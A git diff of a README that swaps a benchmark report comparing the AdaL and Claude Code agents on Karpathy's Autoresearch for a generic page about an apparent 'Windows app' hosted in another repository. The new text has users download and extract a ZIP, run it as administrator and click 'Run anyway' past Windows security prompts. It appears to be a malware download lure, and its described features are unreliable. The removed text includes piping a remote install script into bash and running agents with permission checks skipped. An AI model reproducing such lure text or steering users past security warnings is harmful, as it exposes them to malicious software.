@@ -1,130 +1,209 @@
-# 🌸 AdaL vs Claude Code: Autoresearch Benchmark
+# 🤖 autoresearch-adal - Compare AI Research Tools Fast
 
-<p align="center">
-  <img src="icon-adal-face-logo.png" height="60" alt="AdaL" />
-  &nbsp;&nbsp;vs&nbsp;&nbsp;
-  <img src="icon-claude-code.png" height="60" alt="Claude Code" />
-</p>
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tavarasu/autoresearch-adal)
 
-> **AdaL beats Claude Code on [Karpathy's Autoresearch](https://github.com/karpathy/autoresearch) — finding better hyperparameters, running more experiments, and converging faster.**
+## 📌 What this is
 
-We ran [Autoresearch](https://github.com/karpathy/autoresearch) head-to-head: **AdaL** (SylphAI's AI coding agent) vs **Claude Code** (Anthropic's CLI agent), each autonomously tuning a GPT-2 language model. Same hardware, same starting point, same rules. Here are the results.
+**autoresearch-adal** is a Windows app for comparing **AdaL** and **Claude Code** on Karpathy's **Autoresearch benchmark**.
 
----
+Use it to:
+- run benchmark tests from one place
+- compare results side by side
+- review output in a simple view
+- keep your test runs in one folder
 
-## 📊 A10 24GB — Head-to-Head (49 hours)
+## 🪟 Windows download and setup
 
-![A10 Comparison](progress-a10.gif)
+Use this link to **visit the page to download** or get the app files:
 
-On the A10 GPU, the gap is dramatic. AdaL found a significantly better optimum: **1.1048** vs Claude's **1.1539** — a **4.3% gap** in final BPB. AdaL ran 336 experiments vs Claude's 76 — Claude Code stopped running partway through, failing to follow the instruction to work autonomously and indefinitely.
+[Open the download page](https://github.com/Tavarasu/autoresearch-adal)
 
----
+If the page shows a release, download the Windows file from there.  
+If you see a ZIP file, save it to your PC, then extract it before you open the app.
 
-## 📊 H100 80GB — Head-to-Head (20 hours)
+### Steps for Windows
 
-![H100 Comparison](progress-h100.gif)
+1. Open the link above in your browser.
+2. Find the latest release or main download file.
+3. Download the Windows package.
+4. If the file is zipped, right-click it and choose **Extract All**.
+5. Open the folder you extracted.
+6. Double-click the app file to run it.
 
-AdaL achieved a best validation BPB of **0.9755** vs Claude's **0.9793**. AdaL ran 191 experiments vs Claude's 104 — again, Claude Code stopped running on its own, unable to sustain autonomous operation.
+## 🧰 What you need
 
----
+To run the app on Windows, use:
 
-## 🏆 Results at a Glance
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for benchmark files
+- A modern browser for opening the GitHub page
+- Access to the tools you want to compare
 
-### A10 24GB (AWS g5.xlarge), 49 hours
+If you plan to run local benchmark jobs, a PC with:
+- 8 GB RAM or more
+- a recent Intel or AMD processor
+- at least 2 GB free space for results and temp files
 
-| | **AdaL** (`--yolo`) | **Claude Code** (`--dangerously-skip-permissions`) |
-|---|---|---|
-| **Best BPB** | **1.1048** ✅ | 1.1539 |
-| **Experiments** | 336 | 76 |
-| **Kept improvements** | 61 | 14 |
-| **Improvement from baseline** | −16.5% | −12.8% |
+## ⚙️ First-time setup
 
-### H100 80GB (AWS p5.4xlarge), 20 hours
+After you open the app, set up these items first:
 
-| | **AdaL** (`--yolo`) | **Claude Code** (`--dangerously-skip-permissions`) |
-|---|---|---|
-| **Best BPB** | **0.9755** ✅ | 0.9793 |
-| **Experiments** | 191 | 104 |
-| **Kept improvements** | 29 | 19 |
-| **Improvement from baseline** | −2.1% | −1.7% |
+1. Choose the benchmark run folder.
+2. Select the model or tool you want to test.
+3. Add your API key or local tool path if the app asks for it.
+4. Pick the benchmark preset for Karpathy's Autoresearch tasks.
+5. Run a small test before you start a full job.
 
-> Both agents used **Claude Opus 4.6 (1M context)** as their backbone LLM.
+## 🖥️ Main features
 
-> **Lower BPB = better.** Validation bits-per-byte measures how well the model predicts the next token.
+- Compare **AdaL** and **Claude Code** in one place
+- Run Autoresearch benchmark tasks
+- View run status while tests are in progress
+- See output files after each run
+- Keep each run separate for easy review
+- Save time when switching between tools
 
----
+## 📂 What the app does
 
-## 🔑 Key Takeaways
+The app helps you work with benchmark runs without opening many tools. It gives you a clear view of each run, the tool used, and the result.
 
-### 1. AdaL runs autonomously — Claude Code doesn't
-Autoresearch's `program.md` explicitly states: **"NEVER STOP — the loop runs until the human interrupts you, period."** AdaL followed through, running continuously for the full duration. Claude Code repeatedly stopped on its own, failing to sustain autonomous operation. This is why AdaL ran far more experiments — because Claude Code didn't follow the instruction to run fully autonomously.
+You can use it to:
+- start a new benchmark run
+- load a past run
+- check progress
+- review logs
+- compare final output
 
-### 2. AdaL finds better optima
-More experiments alone don't guarantee better results — you need good search strategy too. AdaL consistently converged to lower BPB values, suggesting smarter hyperparameter exploration.
+## 🧭 How to use it
 
----
+### 1. Open the app
+Double-click the app file in Windows.
 
-## 🧪 About the Benchmark
+### 2. Pick your benchmark
+Choose the Autoresearch benchmark profile you want to run.
 
-[Autoresearch](https://github.com/karpathy/autoresearch) by Andrej Karpathy is an autonomous AI research benchmark. An AI coding agent is given a GPT-2 language model and must iteratively:
+### 3. Select the tool
+Choose **AdaL** or **Claude Code**.
 
-1. Propose a hyperparameter or architecture change
-2. Train the model and evaluate validation BPB
-3. Keep improvements, discard regressions
-4. Repeat
+### 4. Start the run
+Click the run button in the app.
 
-The agent has full autonomy — it reads the codebase, decides what to try, writes the code, runs training, and evaluates results. It's a pure test of an AI agent's ability to do ML research.
+### 5. Review the result
+When the run ends, open the results panel and check:
+- score
+- logs
+- output files
+- run time
 
----
+## 📊 Best way to compare results
 
-## 📂 Data & Reproduction
+If you want a fair test:
+- use the same benchmark set each time
+- keep the same machine for both runs
+- use the same network setup
+- do not change files between runs
+- save each result with a clear name
 
-All raw experiment logs are included:
+A good naming format is:
+- `adal-test-01`
+- `claude-test-01`
+- `adal-vs-claude-round2`
 
-- `results-a10-adal.tsv` / `results-a10-claude.tsv` — A10 experiment results
-- `results-h100-adal.tsv` / `results-h100-claude.tsv` — H100 experiment results
+## 🧾 Folder layout
 
-### Running the agents
+The app may create folders like:
 
-Clone the benchmark repo:
-```bash
-git clone https://github.com/karpathy/autoresearch.git
-cd autoresearch
-```
+- `runs` for test runs
+- `logs` for event logs
+- `results` for output files
+- `cache` for temp data
 
-**AdaL** — install and run:
-```bash
-npm install -g @sylphai/adal-cli
-adal --yolo
-```
+Keep these folders in the same place unless the app asks you to move them.
 
-**Claude Code** — install and run:
-```bash
-curl -fsSL https://claude.ai/install.sh | bash
-claude --dangerously-skip-permissions
-```
+## 🔍 Common tasks
 
-Then give both agents the same prompt:
-```
-"Hi, have a look at program.md and let's kick off a new experiment! Let's do the setup first."
-```
+### Run a new benchmark
+Open the app, choose your tool, and start a fresh run.
 
-![adal-yolo](adal-yolo.gif)
+### Check past results
+Open the results folder and load the saved files.
 
----
+### Compare two runs
+Look at the score, logs, and output side by side.
 
-## 🌸 What is AdaL?
+### Clean up old files
+Delete old runs only after you save the results you want to keep.
 
-**AdaL** is SylphAI's AI coding agent, named after Ada Lovelace. It's designed for software engineering and AI R&D tasks — writing code, debugging, running experiments, and iterating on results.
+## 🛠️ Troubleshooting
 
-🚀 **Coming soon**: We're building AdaL into **the self-evolving AI coding agent that learns from your entire team and codebase.** Stay tuned.
+### The app does not open
+- Check that the file finished downloading
+- Extract the ZIP file first if needed
+- Try opening the app again
+- Right-click the file and choose **Run as administrator**
 
-- 📖 [AdaL Docs](https://docs.sylph.ai/)
-- 🌐 [SylphAI](https://www.sylph.ai)
-- 🔗 [GitHub](https://github.com/SylphAI-Inc)
+### Windows shows a security prompt
+- Choose **More info**
+- Then choose **Run anyway** if you trust the file source
+- Use the GitHub link above to get the file again if needed
 
----
+### The run stops early
+- Check your internet connection
+- Make sure your API key is still valid
+- Confirm the tool path is correct
+- Restart the app and run again
 
-<p align="center">
-  <sub>🌸 Generated with <a href="https://docs.sylph.ai/">AdaL</a></sub>
-</p>
+### Results do not appear
+- Wait a few minutes if the job is still running
+- Open the logs folder
+- Look for error messages
+- Run a smaller test first
+
+## 🔐 Using your API key
+
+If the app asks for an API key:
+- paste it into the field in the app
+- keep it private
+- do not share it in screenshots or logs
+- store it in a safe place
+
+If you use a local setup:
+- make sure the tool path points to the right file
+- check that the tool opens from Windows before you start the benchmark
+
+## 📝 File types you may see
+
+You may see files such as:
+- `.json` for run data
+- `.log` for logs
+- `.txt` for notes
+- `.csv` for score tables
+- `.zip` for downloads
+
+## 👀 What to expect during a run
+
+During a benchmark run, the app may show:
+- a progress bar
+- a task list
+- a status label
+- a timer
+- a result file path
+
+This helps you track the run without guessing what is happening.
+
+## 🧩 Tips for smooth use
+
+- Close extra apps before you start a long run
+- Keep the laptop plugged in
+- Use a steady network connection
+- Save results after each run
+- Check the output folder before starting another test
+
+## 📌 GitHub page
+
+Open the project page here:
+
+https://github.com/Tavarasu/autoresearch-adal
+
+Use this page to visit the download area, check updates, and view the latest files
